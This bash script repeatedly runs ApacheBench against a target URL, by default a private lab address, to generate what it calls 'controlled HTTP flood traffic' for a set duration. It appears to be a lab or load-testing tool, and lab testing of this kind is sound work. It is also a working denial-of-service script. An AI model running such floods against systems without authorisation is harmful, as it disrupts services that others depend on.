#!/usr/bin/env bash
set -u

TARGET="${1:-http://192.168.247.20/}"
DURATION_SECONDS="${DURATION_SECONDS:-180}"
REQUESTS_PER_ROUND="${REQUESTS_PER_ROUND:-2000}"
CONCURRENCY="${CONCURRENCY:-50}"
SLEEP_SECONDS="${SLEEP_SECONDS:-2}"

if ! command -v ab >/dev/null 2>&1; then
  echo "[!] ApacheBench 'ab' is not installed."
  echo "    Install on Kali with: sudo apt install -y apache2-utils"
  exit 1
fi

if [ "$CONCURRENCY" -gt "$REQUESTS_PER_ROUND" ]; then
  echo "[!] CONCURRENCY must be less than or equal to REQUESTS_PER_ROUND."
  exit 1
fi

END_TIME=$((SECONDS + DURATION_SECONDS))
ROUND=1
TOTAL_SENT=0

echo "[*] Controlled HTTP flood traffic"
echo "[*] Target: $TARGET"
echo "[*] Duration: ${DURATION_SECONDS}s"
echo "[*] Per round: ${REQUESTS_PER_ROUND} requests, concurrency ${CONCURRENCY}"
echo "[*] Press Ctrl+C to stop early."

while [ "$SECONDS" -lt "$END_TIME" ]; do
  REMAINING=$((END_TIME - SECONDS))
  echo
  echo "[*] Round $ROUND | remaining ${REMAINING}s"

  ab -n "$REQUESTS_PER_ROUND" -c "$CONCURRENCY" "$TARGET"
  EXIT_CODE=$?
  if [ "$EXIT_CODE" -ne 0 ]; then
    echo "[!] ab exited with code $EXIT_CODE"
  fi

  TOTAL_SENT=$((TOTAL_SENT + REQUESTS_PER_ROUND))
  ROUND=$((ROUND + 1))

  if [ "$SECONDS" -lt "$END_TIME" ]; then
    sleep "$SLEEP_SECONDS"
  fi
done

echo
echo "[*] Finished controlled traffic"
echo "[*] Planned requests sent: $TOTAL_SENT"
